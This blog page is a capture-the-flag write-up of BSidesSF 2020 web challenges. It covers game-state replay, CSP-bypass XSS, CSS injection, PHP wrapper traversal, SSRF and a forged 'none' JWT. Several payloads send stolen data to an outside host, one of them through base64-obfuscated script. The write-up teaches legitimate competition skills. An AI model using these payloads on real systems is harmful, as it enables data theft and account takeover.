<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;977[376pts] cardsSan Francisco has the occasional underground card room. Can you run the table in this game?https:&#x2F;&#x2F;cards-d38741c8.challenges.bsidessf.netIn the challenge sit"><meta property="og:type" content="article"><meta property="og:title" content="BSidesSF 2020 CTF"><meta property="og:url" content="https://blog.p6.is/BSidesSF-2020-CTF/index.html"><meta property="og:site_name" content="POSIX"><meta property="og:description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;977[376pts] cardsSan Francisco has the occasional underground card room. Can you run the table in this game?https:&#x2F;&#x2F;cards-d38741c8.challenges.bsidessf.netIn the challenge sit"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://blog.p6.is/img/2020/02/image-20200225211525791.png"><meta property="og:image" content="https://blog.p6.is/img/2020/02/image-20200225214251382.png"><meta property="og:image" content="https://blog.p6.is/img/2020/02/image-20200225214623280.png"><meta property="og:image" content="https://blog.p6.is/img/2020/02/image-20200225215149637.png"><meta property="og:image" content="https://blog.p6.is/img/2020/02/image-20200225220005141.png"><meta property="og:image" content="https://blog.p6.is/img/2020/02/image-20200225221039313.png"><meta property="og:image" content="https://blog.p6.is/img/2020/02/image-20200225221221820.png"><meta property="og:image" content="https://blog.p6.is/img/2020/02/image-20200225222113311.png"><meta property="og:image" content="https://blog.p6.is/img/2020/02/image-20200225222310259.png"><meta property="og:image" content="https://blog.p6.is/img/2020/02/image-20200225222317282.png"><meta property="article:published_time" content="2020-02-25T22:48:52.000Z"><meta property="article:modified_time" content="2020-03-01T11:29:18.000Z"><meta property="article:author" content="posix"><meta property="article:tag" content="BSidesSF CTF"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://blog.p6.is/img/2020/02/image-20200225211525791.png"><link rel="shortcut icon" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=16"><link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=192" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=180"><title>BSidesSF 2020 CTF</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/rtl.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="POSIX" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fas fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul></ul></span><br><span id="actions"><ul><li><a class="icon" href="/Web-Security-CheatSheet/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" href="/how-pragyan-ctf-2020-hacked/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/BSidesSF-2020-CTF/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/BSidesSF-2020-CTF/&text=BSidesSF 2020 CTF"><i class="fab fa-twitter" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#376pts-cards"><span class="toc-number">1.</span> <span class="toc-text">[376pts] cards</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#51pts-csp-1"><span class="toc-number">2.</span> <span class="toc-text">[51pts] csp-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#51pts-csp-2"><span class="toc-number">3.</span> <span class="toc-text">[51pts] csp-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#87pts-fun-with-flags"><span class="toc-number">4.</span> <span class="toc-text">[87pts] fun with flags</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#51pts-had-a-bad-day"><span class="toc-number">5.</span> <span class="toc-text">[51pts] had a bad day</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#157pts-recipes"><span class="toc-number">6.</span> <span class="toc-text">[157pts] recipes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#51pts-simple-todos"><span class="toc-number">7.</span> <span class="toc-text">[51pts] simple todos</span></a></li></ol></div></span></div><div class="content index py4"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">BSidesSF 2020 CTF</h1><div class="meta"><span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">POSIX</span></span><div class="postdate">&nbsp;<time datetime="2020-02-25T22:48:52.000Z" itemprop="datePublished">2020-02-26</time></div>&nbsp;<div class="article-category">&nbsp;<i class="fas fa-archive"></i> <a class="category-link" href="/category/writeup/">Writeup</a></div>&nbsp;<div class="article-tag">&nbsp;<i class="fas fa-tag"></i> <a class="tag-link-link" href="/tags/BSidesSF-CTF/" rel="tag">BSidesSF CTF</a></div>&nbsp;</div></header><div class="content" itemprop="articleBody"><ul><li><a href="https://ctftime.org/event/977" target="_blank" rel="noopener">https://ctftime.org/event/977</a></li></ul><h2 id="376pts-cards"><a href="#376pts-cards" class="headerlink" title="[376pts] cards"></a>[376pts] cards</h2><blockquote><p>San Francisco has the occasional underground card room. Can you run the table in this game?</p><p><a href="https://cards-d38741c8.challenges.bsidessf.net/" target="_blank" rel="noopener">https://cards-d38741c8.challenges.bsidessf.net</a></p></blockquote><p><img src="/img/2020/02/image-20200225211525791.png" alt="image-20200225211525791"></p><p>In the challenge site, you can play <a href="https://en.wikipedia.org/wiki/Blackjack" target="_blank" rel="noopener">Blackjack</a>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://cards-d38741c8.challenges.bsidessf.net/api/config</span></span><br><span class="line">&#123;<span class="string">"Goal"</span>:<span class="number">100000</span>,<span class="string">"MinBet"</span>:<span class="number">10</span>,<span class="string">"MaxBet"</span>:<span class="number">500</span>,<span class="string">"GameHandler"</span>:<span class="string">"/game.go"</span>,<span class="string">"DeckHandler"</span>:<span class="string">"/deck.go"</span>&#125;</span><br></pre></td></tr></table></figure><p>Users are given <code>$1000</code> initial balance. and from <code>/api/config</code>, you can get the flag when achieve <code>$100000</code>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://cards-d38741c8.challenges.bsidessf.net/api</span></span><br><span class="line">&#123;<span class="string">"SecretState"</span>:<span class="string">"2fd8d83c ... 54e39799"</span>,<span class="string">"PlayerHand"</span>:[],<span class="string">"DealerHand"</span>:[],<span class="string">"Balance"</span>:<span class="number">1000</span>,<span class="string">"GameState"</span>:<span class="string">"Idle"</span>,<span class="string">"SessionState"</span>:<span class="string">"Playing"</span>,<span class="string">"Bet"</span>:<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure><p>In <code>/api</code>, the <code>SecretState</code> property has a hex byte in the form of json, which contains the value of the user’s balance with encryption.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://cards-d38741c8.challenges.bsidessf.net/api/deal</span></span><br><span class="line">&#123;<span class="string">"SecretState"</span>:<span class="string">"e2ad07a3 ... d62c519d"</span>,<span class="string">"PlayerHand"</span>:[[<span class="string">"7"</span>,<span class="string">"Clubs"</span>],[<span class="string">"Queen"</span>,<span class="string">"Clubs"</span>]],<span class="string">"DealerHand"</span>:[[<span class="string">"X"</span>,<span class="string">"X"</span>],[<span class="string">"6"</span>,<span class="string">"Spades"</span>]],<span class="string">"Balance"</span>:<span class="number">990</span>,<span class="string">"GameState"</span>:<span class="string">"Playing"</span>,<span class="string">"SessionState"</span>:<span class="string">"Playing"</span>,<span class="string">"Bet"</span>:<span class="number">10</span>&#125;</span><br></pre></td></tr></table></figure><p>If you send a request to <code>/api/deal</code> with the initial <code>SecretState</code> value, the cards of the player and dealer have randomly chosen. Sometimes the player’s card make BlackJack, and in that case, the game is over and the Balance goes up instantly.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Win or Lose?</span></span><br><span class="line">&#123;<span class="string">"SecretState"</span>:<span class="string">"d113e3fb ... b86484c1"</span>,<span class="string">"PlayerHand"</span>:[[<span class="string">"7"</span>,<span class="string">"Clubs"</span>],[<span class="string">"Queen"</span>,<span class="string">"Clubs"</span>]],<span class="string">"DealerHand"</span>:[[<span class="string">"X"</span>,<span class="string">"X"</span>],[<span class="string">"6"</span>,<span class="string">"Spades"</span>]],<span class="string">"Balance"</span>:<span class="number">500</span>,<span class="string">"GameState"</span>:<span class="string">"Playing"</span>,<span class="string">"SessionState"</span>:<span class="string">"Playing"</span>,<span class="string">"Bet"</span>:<span class="number">500</span>&#125;</span><br><span class="line"><span class="comment">// Blackjack!</span></span><br><span class="line">&#123;<span class="string">'SecretState'</span>: <span class="string">'d113e3fb ... b86484c1'</span>, <span class="string">'PlayerHand'</span>: [[<span class="string">'Jack'</span>, <span class="string">'Spades'</span>], [<span class="string">'Ace'</span>, <span class="string">'Spades'</span>]], <span class="string">'DealerHand'</span>: [[<span class="string">'3'</span>, <span class="string">'Hearts'</span>], [<span class="string">'6'</span>, <span class="string">'Clubs'</span>]], <span class="string">'Balance'</span>: <span class="number">1750</span>, <span class="string">'GameState'</span>: <span class="string">'Blackjack'</span>, <span class="string">'SessionState'</span>: <span class="string">'Playing'</span>, <span class="string">'Bet'</span>: <span class="number">500</span>&#125;</span><br></pre></td></tr></table></figure><p>The point is that if you lose or lose, the SecretState doesn’t destroy the value, so if you keep making deals until the Black Jack comes out, it’s possible to increase Balance continuously.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">state = requests.post(<span class="string">'https://cards-d38741c8.challenges.bsidessf.net/api'</span>).json()[<span class="string">'SecretState'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res = requests.post(<span class="string">'https://cards-d38741c8.challenges.bsidessf.net/api/deal'</span>, json = &#123;<span class="string">'Bet'</span>: <span class="number">500</span>, <span class="string">'SecretState'</span>: state&#125;).json()</span><br><span class="line">    <span class="keyword">if</span> res[<span class="string">'GameState'</span>] == <span class="string">'Blackjack'</span>:</span><br><span class="line">        print(res)</span><br><span class="line">        state = res[<span class="string">'SecretState'</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Flag'</span> <span class="keyword">in</span> res:</span><br><span class="line">        print(res[<span class="string">'Flag'</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>This script implements the description.</p><p><img src="/img/2020/02/image-20200225214251382.png" alt="image-20200225214251382"></p><h2 id="51pts-csp-1"><a href="#51pts-csp-1" class="headerlink" title="[51pts] csp-1"></a>[51pts] csp-1</h2><blockquote><p>Can you bypass the CSP to steal the flag?</p><p><a href="https://csp-1-5aa1f221.challenges.bsidessf.net/" target="_blank" rel="noopener">https://csp-1-5aa1f221.challenges.bsidessf.net</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src 'self' data:; default-src 'self'; connect-src *; report-uri /csp_report</span><br></pre></td></tr></table></figure><p>Basic CSP bypass challenge. There is no filtering policy in script insertion, and Incredibly, the <code>script-src</code> policy authorizes data schema, making CSP meaningless.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"data:,fetch('/csp-one-flag').then(x=&gt;x.text()).then(x=&gt;location='http://rwx.kr/?'+escape(x))"</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/2020/02/image-20200225214623280.png" alt="image-20200225214623280"></p><h2 id="51pts-csp-2"><a href="#51pts-csp-2" class="headerlink" title="[51pts] csp-2"></a>[51pts] csp-2</h2><blockquote><p>Can you bypass the CSP to steal the flag?</p><p><a href="https://csp-2-2446d5a3.challenges.bsidessf.net/" target="_blank" rel="noopener">https://csp-2-2446d5a3.challenges.bsidessf.net</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;self&#39; ajax.googleapis.com &#39;unsafe-eval&#39;; default-src &#39;self&#39; &#39;unsafe-inline&#39;; connect-src *; report-uri &#x2F;csp_report</span><br></pre></td></tr></table></figure><p>It’s similar to previous one. <code>script-src</code> allows embeding <code>ajax.googleapis.com</code> . The <code>ajax.googleapis.com</code> contains an <code>Angularjs</code> script, so you can bypass the <code>CSP</code> using the <code>Angularjs Template</code>.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span> <span class="attr">ng-csp</span>&gt;</span></span><br><span class="line">&#123;&#123;constructor.constructor('eval(atob("ZmV0Y2goIi9jc3AtdHdvLWZsYWciKS50aGVuKHg9PngudGV4dCgpKS50aGVuKHg9PmxvY2F0aW9uPSIvL3J3eC5rci8/Iitlc2NhcGUoeCkp"))')()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/2020/02/image-20200225215149637.png" alt="image-20200225215149637"></p><h2 id="87pts-fun-with-flags"><a href="#87pts-fun-with-flags" class="headerlink" title="[87pts] fun with flags"></a>[87pts] fun with flags</h2><blockquote><p>The admin, Sheldon has the challenge flag, can you steal it?</p><p><a href="https://fun-with-flags-3b5279f5.challenges.bsidessf.net/" target="_blank" rel="noopener">https://fun-with-flags-3b5279f5.challenges.bsidessf.net</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"flag"</span> <span class="attr">value</span>=<span class="string">Try</span> <span class="attr">reading</span> <span class="attr">this</span> <span class="attr">value</span>&gt;</span></span><br></pre></td></tr></table></figure><p>CSS Injection challenge has message sending function to admin.<br>all of other tags are filtered, but because of <code>&lt;style&gt;</code> tags are allowed, you can use the payload generator below to get the value of the input tag with the name property flag.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">header(<span class="string">"Content-Type: text/css; charset=UTF-8"</span>);</span><br><span class="line"><span class="keyword">for</span> ($ascii = <span class="number">20</span>; $ascii &lt; <span class="number">128</span>; $ascii++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($ascii == <span class="number">92</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'input[name=flag][value^="'</span>.$a.htmlentities(chr($ascii)).<span class="string">'"] &#123;</span></span><br><span class="line"><span class="string">                background-image: url("http://rwx.kr/?FOUND='</span>.$a.urlencode(chr($ascii)).<span class="string">'");</span></span><br><span class="line"><span class="string">        &#125;'</span>.<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;let_the_shellz_rise_b4_baking&#125;</span><br></pre></td></tr></table></figure><p>It is convenient to write an attack in Python script. But I sent them one by one because it was hassle.</p><h2 id="51pts-had-a-bad-day"><a href="#51pts-had-a-bad-day" class="headerlink" title="[51pts] had a bad day"></a>[51pts] had a bad day</h2><blockquote><p>Can you read flag.php?</p><p><a href="https://had-a-bad-day-5b3328ad.challenges.bsidessf.net/" target="_blank" rel="noopener">https://had-a-bad-day-5b3328ad.challenges.bsidessf.net</a></p></blockquote><p><img src="/img/2020/02/image-20200225220005141.png" alt="image-20200225220005141"></p><p>There’s two buttons. If click on them, forwarded to <code>/index.php?category=woofers</code> and <code>/index.php?category=woofers</code> each. Since <code>woofer.php</code> shows the same of <code>index.php?category=/woofers.php</code>, we can expect scripts like <code>include($_GET[&#39;category&#39;] + &#39;.php&#39;)</code> to be within <code>index.php</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from index.php?category=php://filter/convert.base64-encode/resource=index</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">'category'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( strpos( $file, <span class="string">"woofers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"meowers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"index"</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> ($file . <span class="string">'.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Sorry, we currently only support woofers and meowers."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>You can get the source of <code>index.php</code> using php wrapper.<br>If the <code>index</code> string is included in the parameter, filtering is likely to be bypassed.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php?category=php://filter/convert.base64-encode/resource=index/../flag</span></span><br><span class="line">PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIENURntoYXBwaW5lc3NfbmVlZHNfbm9fZmlsdGVyc30KPz4=</span><br><span class="line"></span><br><span class="line"><span class="comment">// decoded</span></span><br><span class="line">&lt;!-- Can you read this flag? --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">// CTF&#123;happiness_needs_no_filters&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="157pts-recipes"><a href="#157pts-recipes" class="headerlink" title="[157pts] recipes"></a>[157pts] recipes</h2><blockquote><p>I’ve found this recipe storage service. Rumor has it that the famous San Francisco-based Boudin Bakery is working on a new recipe. Can you get that for me?</p><p><a href="https://recipes-0abb43f9.challenges.bsidessf.net/" target="_blank" rel="noopener">https://recipes-0abb43f9.challenges.bsidessf.net</a></p></blockquote><p>The points of this problem are <code>JWT authentication bypass</code> and <code>SSRF</code>.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"/recipes"</span>&gt;</span>Recipes<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"/logout"</span>&gt;</span>Logout<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item d-none"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"/users"</span>&gt;</span>Users<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Not visible on rendered screen, but you can find <code>/users</code> route from html source.</p><p><img src="/img/2020/02/image-20200225221039313.png" alt="image-20200225221039313"></p><p>If you try to connect, you’ll be given a hint that you can only connect to the local host.</p><p><img src="/img/2020/02/image-20200225221221820.png" alt="image-20200225221221820"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>users<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"recipe-body"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>By posix<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"data:application/octet-stream;base64,CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI<span class="symbol">&amp;#43;</span>Cgo8aGVhZD4KCiAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW ... "</span>&gt;</span></span><br></pre></td></tr></table></figure><p>In recipe creation feature, If you submit with a local host address to <code>Picture URL</code>, you can get the contents of the base64 encoded <code>/users</code> page on the entry of the image address.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'/profile/6180f0c8-778b-442f-a5ab-10e18bef4c2d'</span>&gt;</span>boudin_bakery<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>If you decode the contents, you can find the uuid of the <code>boudin_bakery</code> account.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jwt</span></span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1ODI2Mzk5NzIsImlhdCI6MTU4MjYzNjM3MiwiaXNzIjoicmVjaXBlYm90IiwibmJmIjoxNTgyNjM2MzcyLCJzdWIiOiIyYzc4ZDJmNy03OGRlLTQwYzEtODFjNi1lYTJlOTc3MDQ2YWUifQ.jgTO8jUAOGFi_vmyGhs90aM0PVWU6f8NG5zSRdb8zhw</span><br><span class="line"><span class="comment">// decoded</span></span><br><span class="line">header : &#123;<span class="string">"alg"</span>:<span class="string">"HS256"</span>,<span class="string">"typ"</span>:<span class="string">"JWT"</span>&#125;</span><br><span class="line">content : &#123;<span class="string">"exp"</span>:<span class="number">1582639972</span>,<span class="string">"iat"</span>:<span class="number">1582636372</span>,<span class="string">"iss"</span>:<span class="string">"recipebot"</span>,<span class="string">"nbf"</span>:<span class="number">1582636372</span>,<span class="string">"sub"</span>:<span class="string">"2c78d2f7-78de-40c1-81c6-ea2e977046ae"</span>&#125;</span><br><span class="line">signature : <span class="xml"><span class="tag">&lt;<span class="name">binary</span> <span class="attr">data</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>The JWT stores in cookies contains user’s uuid value.<br>You can change the sub value to a uuid of <code>boudin_bakery</code> account’s using <code>jwt none type input</code>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// plain</span></span><br><span class="line">header : &#123;<span class="string">"alg"</span>:<span class="string">"none"</span>,<span class="string">"typ"</span>:<span class="string">"JWT"</span>&#125;</span><br><span class="line">content : &#123;<span class="string">"exp"</span>:<span class="number">1582639972</span>,<span class="string">"iat"</span>:<span class="number">1582636372</span>,<span class="string">"iss"</span>:<span class="string">"recipebot"</span>,<span class="string">"nbf"</span>:<span class="number">1582636372</span>,<span class="string">"sub"</span>:<span class="string">"6180f0c8-778b-442f-a5ab-10e18bef4c2d"</span>&#125;</span><br><span class="line">signature : <span class="xml"><span class="tag">&lt;<span class="name">binary</span> <span class="attr">data</span>&gt;</span></span></span><br><span class="line"><span class="xml">// built jwt</span></span><br><span class="line"><span class="xml">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJleHAiOjE1ODI2Mzk5NzIsImlhdCI6MTU4MjYzNjM3MiwiaXNzIjoicmVjaXBlYm90IiwibmJmIjoxNTgyNjM2MzcyLCJzdWIiOiI2MTgwZjBjOC03NzhiLTQ0MmYtYTVhYi0xMGUxOGJlZjRjMmQifQ.</span></span><br></pre></td></tr></table></figure><p>If you complete jwt in the above way and try connecting, you can see the flag in the <code>Flag Bread</code> item.</p><p><img src="/img/2020/02/image-20200225222113311.png" alt="image-20200225222113311"></p><h2 id="51pts-simple-todos"><a href="#51pts-simple-todos" class="headerlink" title="[51pts] simple todos"></a>[51pts] simple todos</h2><blockquote><p>For my new job as a San Franisco tour guide, I totally realized that I can use the Meteor <a href="https://www.meteor.com/tutorials/blaze/creating-an-app" target="_blank" rel="noopener">simple-todos tutorial</a>! It was really easy, the app works perfectly by step 9 of the tutorial, you don’t even need to write your own ‘publish and subscribe’ code! It’s all done for you!</p><p><a href="https://simple-todos-6c7bf285.challenges.bsidessf.net/" target="_blank" rel="noopener">https://simple-todos-6c7bf285.challenges.bsidessf.net</a></p></blockquote><p>This is the challenge about Information Disclosure using WebSocket. The private message does not appear on the screen, but it sends it to the client without any special permission settings. This allows you to view a private message simply by checking the web socket communications history.</p><p><img src="/img/2020/02/image-20200225222310259.png" alt="image-20200225222310259"></p><p><img src="/img/2020/02/image-20200225222317282.png" alt="image-20200225222317282"></p></div></article><div class="blog-post-comments"><div id="disqus_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" 